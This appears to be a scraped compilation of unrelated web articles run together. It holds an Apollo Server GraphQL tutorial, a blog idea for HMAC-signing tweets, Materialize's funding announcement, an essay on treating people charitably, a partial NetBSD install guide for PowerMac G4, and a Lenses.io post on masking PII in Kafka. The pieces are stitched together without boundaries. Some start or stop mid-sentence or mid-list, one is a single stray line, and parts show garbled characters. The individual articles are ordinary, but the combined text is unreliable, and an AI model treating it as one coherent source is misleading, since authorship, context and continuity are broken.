tab)" href="https://github.com/apollographql/apollo-server/tree/cfb086227e623ba1531bb887c3919e224682ccbc#comparison-with-express-graphql" target="_blank" rel="noreferrer noopener">here</a> (Git never forgets!).</p><p>There are other tools like Hasura, Prisma, etc., but those are related to ORM’s and other functionalities, and we will not be discussing those as options for this post.</p><p>Other benefits of Apollo server include:</p><ul><li>A plethora of built-in features</li><li>Huge community support (plus used at enterprises)</li><li>Frequently updated</li><li>Loads of additional libraries and tooling for different purposes</li><li>Interoperability with other frameworks</li></ul><p>With that, let us get started building a fully functional GraphQL API using Apollo Server. Our API will support both queries and mutations for reading and updating data. If you do not know about the <a href="https://www.wisdomgeek.com/development/web-development/graphql-basics-types-queries-mutations-schema/">GraphQL types (queries and mutations)</a>, we recommend reading our previous post about it. And if you are new to GraphQL itself, the post regarding <a href="https://www.wisdomgeek.com/development/web-development/why-graphql/">Why GraphQL </a>might be helpful to understand the advantages of GraphQL.</p><h2>Using GQL to create our type definitions</h2><p>Before doing anything, we will create a directory and use npm/yarn to install apollo-server in our project. Assuming that we have already done that, we will create a server.js file in our folder.</p><p>Apollo server provides us a named export “gql” that allows us to declare type definitions and resolvers. gql uses JavaScript template literals as a parameter passing mechanism. So instead of invoking it as a function, we invoke it using the tagged template literal syntax.</p><p>A schema definition contains the type definitions and all their relationships. But it needs to be enforced by the server. And that is what a type definition is. We use the gql named export, passing in our schema definition to get our type definitions.</p><pre><code>const { gql } = require('apollo-server');

const typeDefs = gql`
  # Our schema will be written here
`;</code></pre><p>With the type definitions in place, we have a definition that apollo knows about, but we cannot call these queries because they do not do anything right now. For the GraphQL API to be functional, we need to define resolvers.</p><h2>Defining Resolvers for the GraphQL Server</h2><p>Resolvers are functions that are responsible for populating the data for fields in our schema.</p><p>Resolvers are not a part of the GraphQL specification. But they are the typical way most GraphQL servers implement and process GraphQL requests. Every field defined in the type definition must have a corresponding matching resolver field for it to participate in the GraphQL request.</p><p>The GraphQL specification requires a root level query definition in the GraphQL type definition. We will create a resolver object in our code next. Taking a subset of our schema from the previous post:</p><pre><code>type Post {
  id: ID!
  title: String!
}
type Query {
  getAllBlogs: [Post]
}</code></pre><p>We will start defining our resolver. Resolvers are an object which references all the types in the schema and their resolver functions.</p><h3>Resolver function</h3><p> A resolver function is a convention used to map all fields in the type, and it takes in 4 parameters: parent, arguments, context, and information. It returns a result whose type is defined in the schema.</p><p>The parent parameter gives us the parent resolver of the current resolver. Since queries can be nested, this parameter helps us know the parent that invoked the current resolver. For a top-level resolver, it will be undefined.</p><p>The arguments parameter tells us what gets passed into the GraphQL request.</p><p>The context typically is some global configuration for our application (for example a database connection string).</p><p>The information parameter contains information about our application like the state of the application.</p><h3>Creating resolvers</h3><p>For our getAllBlogs resolver, the return type needs to be a list of posts. Let us create a JavaScript object for this and return it for now.</p><pre><code>const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      const blogs = [
        {
          id: 1,
          title: 'Why GraphQL?',
        },
        {
          id: 2,
          title: 'Creating a GraphQL API with Apollo Server',
        },
      ];
      return blogs;
    },
  },
};</code></pre><p>Before we get to the next step, it is important to point out that Apollo can do automatic generation of resolver functions. If the parent argument has a property with the resolver’s name and a corresponding value associated with it, Apollo server return’s the property’s value. If there is a mismatch in the name, it returns undefined. If the value is a function, it invokes the function and return’s the function’s return value.</p><p>For this case, we will explicitly create a resolver for each of the fields in the Post type as well. This is optional. But this gives us an idea of how the parent parameter can be used. Our resolvers object becomes:</p><pre><code>const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      const blogs = [
        {
          id: 1,
          title: 'Why GraphQL?',
        },
        {
          id: 2,
          title: 'Creating a GraphQL API with Apollo Server',
        },
      ];
      return blogs;
    },
  },
  Post: {
    id: (parent) =&gt; parent.id,
    title: (parent) =&gt; parent.title,
  },
};</code></pre><h2>Putting things together</h2><p>Now that we have our type definitions and resolvers written, we need to put those together, passing them to apollo server, and launch it. Just like we launch an express server with configurations, we start our apollo server:</p><pre><code>const server = new ApolloServer({ typeDefs, resolvers });
server.listen(4000).then(({ url }) =&gt; {
  console.log(`Server started at ${url}`);
});
</code></pre><p>If we run node server.js in the command prompt, the server should be up and running. Next, we go to localhost:4000 in our browser. We get a GraphQL playground that lets us send post commands to the server we just built. We will use this to query for our posts. IntelliSense can be used here to create our query. Upon execution of the query, we will get our hardcoded posts from the server.</p><figure><img src="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1024x333.png" alt="" srcset="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1024x333.png 1024w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-300x98.png 300w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-768x250.png 768w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1536x500.png 1536w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-696x226.png 696w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response-1392x453.png 1392w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-query-response.png 1758w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><h2>Implementing Mutations</h2><p>Now that we know how to do queries, implementing mutations seems like an easy task. We need to add a mutation property to our type definition and implement it in the resolvers. Let us write a mutation to update the title of a blog post.</p><p>We add it to the type definition:</p><pre><code>type Mutation {
  updateBlogPost(id: ID!, title: String!): Post
}</code></pre><p>And the resolver has an additional property:</p><pre><code>const resolvers = {
  Query: { ... },
  Mutation: {
    updateBlogPost: (_, args) =&gt; {
      let blog = blogs.find((blog) =&gt; blog.id == args.id);
      if (blog) {
        blog.title = args.title;
        return blog;
      }
    },
  }
}</code></pre><p>We can then invoke the mutation in our playground after running the server and get the updated value back.</p><figure><img src="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1024x275.png" alt="" srcset="https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1024x275.png 1024w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-300x80.png 300w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-768x206.png 768w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1536x412.png 1536w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-696x187.png 696w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response-1392x373.png 1392w, https://www.wisdomgeek.com/wp-content/uploads/2020/12/apollo-server-mutation-response.png 1603w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>The final code for our working server thus becomes:</p><pre><code>const { gql, ApolloServer } = require('apollo-server');

const blogs = [
  {
    id: 1,
    title: 'Why GraphQL?',
  },
  {
    id: 2,
    title: 'Creating a GraphQL API with Apollo Server',
  },
];

const typeDefs = gql`
  type Post {
    id: ID!
    title: String!
  }

  type Query {
    getAllBlogs: [Post]
  }

  type Mutation {
    updateBlogPost(id: ID!, title: String!): Post
  }
`;

const resolvers = {
  Query: {
    getAllBlogs: () =&gt; {
      return blogs;
    },
  },
  Post: {
    id: (parent) =&gt; parent.id,
    title: (parent) =&gt; parent.title,
  },
  Mutation: {
    updateBlogPost: (_, args) =&gt; {
      let blog = blogs.find((blog) =&gt; blog.id == args.id);
      if (blog) {
        blog.title = args.title;
        return blog;
      }
    },
  },
};

const server = new ApolloServer({ typeDefs, resolvers });
server.listen(4000).then(({ url }) =&gt; {
  console.log(`Server started at ${url}`);
});
</code></pre><p>We hope this helps in getting started with Apollo Server! If you have any queries, drop a comment below, and we will help you out.</p></div></div></div>]]>

<p>I thought about using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/HMAC" target="_blank">HMAC</a> to solve this problem, where <strong>the secret</strong> is something that only Twitter knows and it’s <strong>tied to each user</strong>. Every tweet must have an SHA 256 signature, <strong>signature = HMAC(user.secret, tweet).</strong></p>



<p>For the sake of UX/UI, this signature can show only its first ten characters, a short hash and it still retains a good number of permutations (16^10).</p>



<p>Now when you see a print screen <strong>claiming</strong> that @someone told “this and that” you can <strong>go to</strong> somewhere like twitter.com/<strong>check</strong> and <strong>type</strong> the username, the message plus its <strong>alleged signature</strong> and verify whether it’s fake or might be legit.&nbsp;</p>



<p>Sounds good and simple, done:</p>

<p><strong>Of course not</strong>, such an idea needs to be refined and proven to be safe. <strong>I foresee many challenges</strong>, one of them being, let’s say someone is trying to check a print however this person might <strong>not be able to replicate</strong> the images, emojis, special characters or even to match the number of spaces/newlines.&nbsp;</p>



<p>For that reason, a kind of allow list filtering out anything else might be in hand. The question is, what characters such a set would hold? The basic Latin character set [a-z, A-Z] is not enough. We have special accent characters in languages such as Portuguese, Spanish and French. And languages such as Hebrew, Japanese, Chinese are best represented by Unicode/UTF-8 characters.</p>



<p>Also, since I’m not a security specialist in any capacity, I don’t know what happens <strong>if the secret remains the same over time</strong> with a ton of tweets and signatures exposed. Is it possible for an observer <strong>to break</strong> this thing?</p>



<p>Well, that’s my silly approach to try to fight the Fake Tweet Print Screen. What do you think? Is it feasible? Is it even necessary to build such a system? Or is it just a plain stupid idea?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today we <a href="https://www.prnewswire.com/news-releases/materialize-raises-40-million-to-simplify-streaming-data-with-sql-and-speed-up-real-time-analytics-301180777.html">announced</a> that we raised a $32M Series B round of funding led by Kleiner Perkins. This follows a $8.5m Series A last year led by Lightspeed Venture Partners, bringing our total funding to-date to a little over $40 million. With our Series B, <a href="https://www.kleinerperkins.com/people/bucky-moore/" target="_blank" rel="noopener noreferrer">Bucky Moore</a> joins <a href="https://lsvp.com/?team=ravi-mhatre/" target="_blank" rel="noopener noreferrer">Ravi Mhatre</a> on our board of directors.</p>
<p>At Materialize, we believe that at every business it will soon be essential for all information to be always up-to-date. Whether it’s delivering personalized experiences, accurately identifying fraud, building predictive AI, or discovering new business opportunities, the ability to run complex queries on multiple streams of data and keep their answers up to date is critical to making better decisions about the changing world around us.</p>
<p>While the past decade has seen a groundswell in the adoption of streaming platforms, they are still too difficult to use. Current systems require users to make tradeoffs between dumbing down their queries, waiting for hours-long batch ETL pipelines to finish, or building and orchestrating sprawling microservices. We believe users should not have to make these tradeoffs.</p>
<p>Materialize’s mission is to make queries against streaming data simple. We support industry standard SQL: write queries with multi-way joins, correlated subqueries, and complex aggregations, and we’ll keep the answers always up to date for you. In a world where “real-time” has become an empty buzzword, Materialize provides answers that are up to date within milliseconds. All of this comes in <a href="https://materialize.com/docs/install/" target="_blank" rel="noopener noreferrer">a single binary</a> that is easy to install, easy to use, and easy to deploy. With Materialize, users can get interactive and always-up-to-date answers about their changing data using only their existing SQL skills.</p>
<p>While Materialize is a young company, it is built on top of the award winning Timely Dataflow project, spanning almost a decade of cutting-edge research on stream processing led by my co-founder Frank McSherry. Starting from this solid foundation, $40 million dollars of capital gives us the resources to build the no-compromise streaming database that lets every developer build streaming applications.</p>
<p>With this new round of funding, we are well equipped to deliver on <a href="https://materialize.com/blog-roadmap/" target="_blank" rel="noopener noreferrer">an ambitious roadmap</a>, including a fully-managed cloud service with tiered storage and replication. We’re also excited to continue work on broadening the suite of SQL tools that we support, as well as investing in a SQL optimizer, performance and benchmarking work, and in making Materialize more resilient and battle-tested. If you’re interested in working on any of these challenges, Materialize <a href="http://materialize.com/careers" target="_blank" rel="noopener noreferrer">is hiring</a> across the board.</p>
<p>And finally, while it is exciting to build Materialize, it has been even more exciting to see how Materialize is being used to build applications that previously would have required months of development, using just a few simple SQL queries. If you’re as excited about Materialize as we are, we’d love for you to get involved. <a href="https://materialize.com/quickstart/" target="_blank" rel="noopener noreferrer">Download</a> and try Materialize, try <a href="https://materialize.com/docs/katacoda/?intro-wikipedia" target="_blank" rel="noopener noreferrer">a demo</a> in your browser, <a href="https://join.slack.com/t/materializecommunity/shared_invite/zt-jjwe1t45-klG9k7V7xibdtqA6bcFpyQ" target="_blank" rel="noopener noreferrer">join the community</a> and say hello, or <a href="http://materialize.com/careers" target="_blank" rel="noopener noreferrer">apply</a> to join our growing team today!</p>

After completion, if the memory cache is smaller than 2MByte, it is written to a <a href="https://docs.rs/rkv/0.9.6/rkv/">rkv</a> cache.

<p>Clifford Stott is famous for <a href="https://www.scientificamerican.com/article/taming-the-madness-of-crowds/">decreasing European football hooliganism and rioting</a>. He trained the police on “low-profile, nonaggressive tactics” and said to “leave the riot gear behind.” It worked. Turns out, when hooligans aren’t treated like hooligans, they stop acting like hooligans. </p>



<p>Thinking about my <a href="https://critter.blog/2020/08/28/your-client-is-a-free-resource-not-a-problem/">toughest clients</a>, my most <a href="https://critter.blog/2020/10/28/the-all-powerful-bad-apple/">abrasive coworkers</a>, my <a href="https://critter.blog/2020/10/23/parenting-doesnt-do-what-i-thought/">misbehaving kids</a>, and my drama-filled family members, I wonder how much of that was a self-fulfilling prophecy. I thought they were that way, so I treated them that way, so they acted that way.</p>



<figure><blockquote><p>We become what we are told we are.</p><cite>Fredrik Backman, <em>Beartown</em></cite></blockquote></figure>



<p><a href="https://critter.blog/2020/08/26/extreme-ownership-book-notes/">Extreme Ownership</a> has a fantastic chapter called “Leading Up and Down The Chain”. It explains that whenever anyone is acting a fool, you have to ask yourself what <em>you </em>are doing wrong to cause that.</p>



<p>If your boss is being a jerk, assume for a second that’s <em>your</em> fault. What are you doing that’s making her lash out? What are you not giving her that she needs? Are you expecting her to be a jerk and letting that tarnish your interaction with her? “We become what we are told we are.”</p>



<p>Lots of parenting books talk about breaking <a href="https://critter.blog/2020/06/10/spotting-broken-processes/">a cycle that isn’t working</a>. Say my kid resists doing his homework, and every night is a battle about it that ends with yelling and tears. That’s a cycle that isn’t working. I can keep trudging up that terrible hill, or I can break the cycle. Maybe <a href="https://critter.blog/2020/10/12/failing-with-abandon/">failing with abandon</a> is the answer for once. Maybe if I treat him like a kid who does his homework willingly, then he’ll become that kid. “We become what we are told we are.”</p>



<p>This all boils down to the cliche that we should take the charitable stance. But that’s a tough rule to follow in the moment. Instead, try this: <em>treat everyone like the person you want them to be, rather than the person you think they are</em>. </p>



<p>(And if you’re sure it won’t work with that one toxic person you have in mind, <a href="https://critter.blog/2020/09/21/experimenting-on-myself/">pitch it as an experiment</a> since that way <a href="https://critter.blog/2020/10/26/you-cant-fail-at-experiments/">you can’t fail</a>!)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="summary">Summary</h2>
<p>A Power Macintosh G4 system is so named because it is powered by a <a href="https://en.wikipedia.org/wiki/PowerPC_G4">PowerPC G4 CPU</a>. The G4 chip powered several Apple systems for roughly a five year period (1999 - 2004). After the G4 era Apple used another PowerPC chip, the G5, and then transitioned to Intel based chips until 2020 with the introduction of ARM based systems. The history of the PowerPC family of chips and the collaboration between IBM, Motorola, and Apple is well worth reading up on if you are a fan of computing history.</p>
<p>In any event, Appleâ€™s G4 based product line was very popular and there are many available cheaply on the second hand market. A PowerPC based Apple computer running NetBSD is a nice low cost platform for hobby and research projects!</p>
<p>Using some rough benchmarks my G4 system is about 15 times slower than a modern (lower end) dual core Windows 10 computer I have. Still, for computers which are roughly twenty years old (as of this writing) they are surprisingly performant. NetBSD is as lean and mean of an Operating System as you can get and you can be assured you are getting about as much computational horsepower as possible out of these machines.</p>
<p>An outline of what follows:</p>
<ul>
<li>The NetBSD installer can be booted from a variety of media. Here I describe using a USB drive. If you use a CD or other installation media these steps will still mostly be the same, albeit it with minor modifications.</li>
<li>The target system had no OS on it at the time of installation. I do not describe the use of Mac OS X based tools on the target system. That is certainly a viable option but not one I am as familiar with.</li>
<li>I assume that you will be using this system exclusively for NetBSD. Multibooting will either require either a different partitioning scheme than what I describe here or separate drives for each OS.</li>
<li>Disk partitioning was done using <a href="https://man.netbsd.org/macppc/pdisk.8">pdisk</a> in the installer.</li>
<li>Once the installation is completed several steps still need to be done in order to have NetBSD boot normally. These systems boot using <a href="https://en.wikipedia.org/wiki/Open_Firmware">Open Firmware</a> v3.0 which requires slightly different steps than systems with older Open Firmware versions.</li>
<li><strong>Make sure you do some reading and understand pdisk and Open Firmware before proceeding.</strong></li>
<li><strong>You should absolutely expect to start/stop this process a few times as you hit snags and deepen your knowledge of the process. Consider this a good thing! You are getting a valuable experience in hardware and processes known to only a relatively small number of people!</strong></li>
</ul>

<p>I did not happen to have any CD-R media available so I decided to boot the installer off of a USB drive. Surprisingly this method is not covered at all in the official docs but I eventually found something done for <a href="https://people.freebsd.org/~seanc/freebsd/create-memstick-osx/">FreeBSD</a> which described the necessary process.</p>
<ol type="1">
<li>Download the installer .iso. I used <a href="https://cdn.netbsd.org/pub/NetBSD/NetBSD-9.1/images/NetBSD-9.1-macppc.iso">this one</a>.</li>
<li>Write this to a USB drive. On Linux or OS X you would use the <code>dd</code> command. On Windows there is a tool called <a href="https://rufus.ie/">rufus</a> for doing this. I used an OS X computer for creating the installation media.</li>
<li>In the Terminal I used <code>diskutil</code> to confirm the device for my USB drive. In the output below you can see that <code>/dev/disk8</code> is the USB drive I want to use.</li>
</ol>

<p>Ok, this is perhaps the trickiest part because the information anyone reading this might need most likely will vary!</p>
<ol type="1">
<li><p>Put the USB drive into one of the Macâ€™s USB ports. Power on the system and hold down the CMD+Option+O+F keys until you are dropped into the Open Firmware prompt.</p></li>
<li><p>Now you need to identify a few things using the <code>devalias</code> command. Type <code>devalias</code> and hit enter and inspect the output. Can you see the USB devices? You might see two, one for your keyboard and the other is your drive. Can you see one named <code>hd</code>? That is your harddrive. You might havew multiple harddrives installed though. Which one do you plan on installing the system on? In the References section at the end of this article check out and read the Open Firmware pages I link to. Consider this required homework for a successful NetBSD/MacPPC installation!</p></li>
<li><p>After understanding the device IDs for your USB drive with the installer and the drive you will be installing to you can boot with a command that looks like this:</p></li>
</ol>
<p><code>boot usb1/disk:,\ofwboot.xcf netbsd.macppc</code></p>
<p>If this is successful you should see a bunch of boot messages and then the initial installer screen.</p>
<p>If youâ€™ve made it this far, to a booted installer, savor your success before moving on to the next step.</p>
<h2 id="partitioning">Partitioning</h2>
<ol type="1">
<li><p>In the installer menu choose the option to drop to a shell. Alternatively you could have chosen to drop to a shell immediately before the installer fully loads. Either one is fine. If you chose to drop to a shell instead of the installer you will need to run the <code>sysinst</code> command when you are done partitioning to get back to the installer.</p></li>
<li><p>Execute the <code>pdisk</code> command. Your command will look something like <code>pdisk /dev/rwd0c</code>. In fact that might be exactly it, but to be sure you can look through the output of <code>dmesg</code> or <code>ls /dev</code>. Keep in mind that this is the same drive referred to as <code>hd</code> in Open Firmware and that the partitions you create here will map to, for example, <code>hd:2</code> or <code>hd:3</code> when you get around to the final boot configurations.</p></li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Several years ago when I was working on a big data project, I saw something a data engineer shouldn’t see. Curious to understand the level of detail in a new credit score dataset we’d received in our data lake, I queried it. I was surprised at how easily and suddenly my screen was flooded with the mortgage history, overdraft limits and year-end financial statements of my colleagues, and I felt deeply uneasy. 
</p><p>If I stumbled upon this data, how easy would it be for a malicious user to sell PII (personally identifiable information) data across the dark web? The kind of breach that has since lost trading licenses and slapped several organizations with fines for millions of dollars.</p><p>More recently, contracting at a large global financial services firm, my team encountered constant challenges getting our data projects signed off and into production. The biggest was meeting the maze of data compliance controls. 
</p><p>Asking for special dispensation was getting more difficult in a world of Dodd-Frank, MIFID II and post-financial crash. 
</p><p>Fast forward a few years, the level of regulation has increased, as has the need for engineering teams to continuously access real-time data.
</p><p>We knew that helping organizations meet data compliance for Apache Kafka should be one of our priorities. This would be with the following in mind:
</p><ul><li><p> <b>Responsiveness to real-time needs: </b>The likes of Apache Kafka are powerful Open Source streaming technologies, but we need rules in place to make them useful for business outcomes.</p></li><li><p> <b>
Design for a world of DevOps and DataOps:</b> This means introducing controls in a world of agile data management and data engineering.</p></li><li><p> <b>Flexibility to apply constant regulation updates</b> and change access controls to cover multiple regulatory frameworks, including SEC,<a target="_blank" href="https://lenses.io/blog/2020/04/how-you-can-keep-your-real-time-data-operations-on-the-right-side-of-gdpr-apache-kafka/"> GDPR</a>, CCPA, HIPAA etc.
</p></li><li><p> <b>Identifying (and mitigating) data risk:</b> Not all data carries the same impact and level of confidentiality. </p></li><li><p> <b>Passing audits without manual processes:</b> Helping speed up the reporting time of audits.</p></li></ul><p>For us this has been implemented as a Data Policy framework. 
</p><p>The framework is designed to cover data compliance and information security best practices for real-time data. 
</p><p>And although we often talk about protecting PII data, the Data Policies framework helps address data compliance more broadly.  For example, we give visibility over sales transactions whilst masking the order value from internal employees to meet insider trading compliance. 
</p><p>Here we outline the framework and the journey you can take to increase your compliance. </p><h2>Discovery of PII residing in Kafka</h2><p>As your Kafka adoption across teams and projects expands, it’s easy for data sources to proliferate. And to find yourself non-compliant at any moment.&nbsp;&nbsp;</p><p>Keeping track of information flowing through Apache Kafka will be especially important when it comes to conducting audits.&nbsp;&nbsp;</p><p>But Apache Kafka as a black box doesn’t make this easy.</p><p>This usually means weeks if not months of manual reporting and interviewing teams when it comes to a compliance audit.&nbsp;</p><p>This is the first problem we're addressing with our<a href="https://help.lenses.io/using-lenses/data/data-policies/"> Data Policies</a>.</p><p>We do this by intelligently keeping track of metadata across your Kafka Streams, no matter the serialization (CSV, <a target="_blank" href="https://lenses.io/videos/custom-serde-classes-google-protobuf-for-apache-kafka/">Protobuf </a>and custom proprietary formats).&nbsp;</p><p>It’s the same technology that powers our <a target="_blank" href="https://lenses.io/blog/2020/07/Why-new-Streaming-SQL-opens-up-data-platform/">SQL engine</a> to query data on the wire as well as our <a target="_blank" href="https://lenses.io/blog/2020/07/data-dump-real-time-data-catalog-apache-kafka/">data catalog</a>.&nbsp;</p><p>And it's presented as a data experience UI. Having a variety of ways to interface with data policies makes it easier to zoom in or out of topics and applications to see how they are interrelated, whether in a list or in a Topology as shown here:</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/4ZsimkLEYFBGwb0hyLIl42/e02f5ddd45be08a4bddc0b1c3fadb865/Data-Policies-Illustrations_04.png" alt="Data-Policies-Kafka"></p><p>Understanding how data is related allows us to define interesting fields that represent datasets. More on this later.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/MBUcR5AREioRWHA5pJKgl/cdddbeedf7492b1ce0e10424345b3dbc/data-policies-3.png" alt="data-policies-3"></p><p>This detection covers the datasets themselves (Kafka Topics or Elasticsearch Indexes) as well as the applications (this can be anything from your custom external producer/consumer applications and microservices, <a target="_blank" href="https://lenses.io/connect/">Kafka Connect connectors</a> or Lenses Streaming SQL applications).&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/4wamiKZYyHtyao58emzBA3/d29b392a067bf35e5254e1fd69a4fc0a/data_policies_kafka.png" alt="data policies kafka"></p><h2>Categorizing PII</h2><p>With your streaming data discovered, the next step is to classify the data.&nbsp;</p><p>We used the National Institute of Standards and Technology (NIST) and their <a target="_blank" href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-122.pdf">guidelines for protecting PII</a> to help.</p><p>This Ontology can be tuned to the specific business domain or data domain such as ‘crypto-assets’, a regulatory framework such as ‘MiCA’ and a confidentiality level.</p><h3>An example of Data Protection Ontology</h3><p><u>Name</u> : <i>Full Name, Maiden Name, Mother’s name, Alias</i></p><p><u>Personal Identification Information</u> :<i> SSN, Passport number, Driver’s license Number, TaxPayer identification number, Patient Identification Number, Financial Account, Credit Card Number, Login name / Username</i></p><p><u>Address Information</u> : <i>Street Address, Email Address, Zip Code, City, Country</i></p><p><u>Asset Information</u> : <i>IP Address, MAC Address</i></p><p><u>Telephone Number</u> : <i>Mobile, Business and Personal number</i></p><p><u>Personally owned property</u> : <i>Vehicle registration Number</i></p><p><u>Personal linkable Information</u> :<b> </b><i>Data of birth, age, place of birth, religion, race, weight, height, activities, geographical indicators, employment information, medical info, educational info, financial info</i></p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3IG62VjzyLiRiO7Cgd1noF/9e3454ffd16519fa82178741bd3ebd91/data_policies_2__1_.png" alt="data protection ontology"></p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/7KlbbKO1ms1L1ZLraynI80/cf46bc21bc2bb6e3f962ac69a4b1c8b8/data_protection_ontology1.png" alt="data protection ontology1"></p><p>Of course, not all data have the same confidentiality impact level. Fields that can be used to fully identify a person (i.e. Passport or Social Security Number) have to be treated with additional care, whereas information like Country or Postcode can only partially reveal the identity of a subject.</p><p>Here we’ve highlighted data at different impact levels. Social Security Number is very high, whereas postcode is comparatively low.&nbsp;</p><p><code>SSN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Financial&nbsp;Account&nbsp;number&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Biometric&nbsp;Records&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Medical&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Passport&nbsp;Number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Phone&nbsp;number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;medium</code></p><p><code>Postcode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;low</code></p><p><code>Religion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;low</code></p><p>The combination of the Data Policy impact level with the detected streams and applications helps risk managers and compliance officers ensure they apply the appropriate safeguards based on the confidentiality impact level.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/2S6rCLEvDuyjOfXDQeUrep/191a6e45b9779abe4dbb0756cad29161/data_policies_1__1_.png" alt="data policies ontology impact levels (1)"></p><h2>Data Masking &amp; PII confidentiality</h2><p>With data discovered and classified, the final step is to redact or anonymize data, so that users can access it whilst meeting compliance.</p><p>For many, this can be one of the biggest compliance challenges you will encounter whilst working with Kafka.&nbsp;</p><p>For Lenses, this is achieved through redaction rules associated with each Policy. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/1H7EA7ZDhImZ1K1cLzljR6/792b2c2f602504941683831c9787f061/data_redaction_policy_kafka.png" alt="data redaction policy kafka"></p><p>When data is accessed by a user that matches a Policy, we can automatically anonymize data.&nbsp;&nbsp;</p><p>Here are some examples of redaction policies and how they may mask fields within streaming data.&nbsp;</p><p>Policy&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sample Data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sample Output</p><p>Initials Only &nbsp; &nbsp; &nbsp; &nbsp; Jon Smith&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; J S</p><p>First-3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (212) 509-6995&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (212) xxx-xxxx</p><p>Last-4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4111 4050 6070 8090 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xxxx xxxx xxxx 8090</p><p>Redaction &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 123 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xxx</p><p>Email Mask&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; myEmail@org.com &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a target="_blank" href="mailto:mxxxxx@org.com">mxxxxx@org.com</a></p><p>The masking is applied on-the-fly as opposed to redacting the data at rest or on the wire.

It is not implemented - it is applied. 
</p><p>In fact, features like these are helping data engineers at heavily regulated firms:
</p><ul><li><p> <!-- -->Move their data projects from pilot to production
</p></li><li><p> <!-- -->Reduce their <a target="_blank" href="https://lenses.io/customers/viseca/">time-to-market by 10x
</a></p></li><li><p> <!-- -->Create policies that are easy to remember, and easy to apply
</p></li><li><p> <!-- -->Move forward with a technology-agnostic governance framework
</p></li></ul><p>We hope they do the same for yours.
